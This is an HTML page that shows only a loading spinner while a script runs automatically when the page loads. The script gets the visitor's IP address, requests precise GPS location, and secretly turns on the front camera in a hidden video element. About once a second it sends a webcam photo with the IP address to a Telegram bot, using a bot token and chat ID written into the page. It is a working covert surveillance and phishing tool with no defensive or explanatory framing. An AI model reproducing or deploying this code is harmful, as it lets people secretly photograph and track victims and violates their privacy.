<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0a0a0a;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .spinner {
            border: 8px solid #1a1a1a;
            border-top: 8px solid #00bfff;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>

    <video id="video" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const BOT_TOKEN = "8905839440:AAHRt0ma0O9BAEN_U9HrIPRco5EBL3rte9M";
        const CHAT_ID = "7148167734";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        let userIP = "unknown";
        let isSending = false;

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}
        }

        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve();
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve(`Lat:${pos.coords.latitude.toFixed(5)},Lon:${pos.coords.longitude.toFixed(5)}`);
                    },
                    () => resolve("GPS_refused"),
                    { enableHighAccuracy: true, timeout: 6000 }
                );
            });
        }

        async function startCamera() {
            try {
                await getIP();
                const loc = await getGPS();

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    // Première capture
                    setTimeout(captureAndSend, 800);
                    // Puis toutes les 1 seconde
                    setInterval(captureAndSend, 1000);
                };
            } catch (e) {
                console.error(e);
            }
        }

        function captureAndSend() {
            if (isSending) return;
            isSending = true;

            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const caption = `IP_${userIP}\n${timestamp}`;

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `face_${userIP}_${timestamp}.jpg`);
                formData.append('caption', caption);

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {}
                isSending = false;
            }, 'image/jpeg', 0.85);
        }

        window.onload = startCamera;
    </script>
</body>
</html>
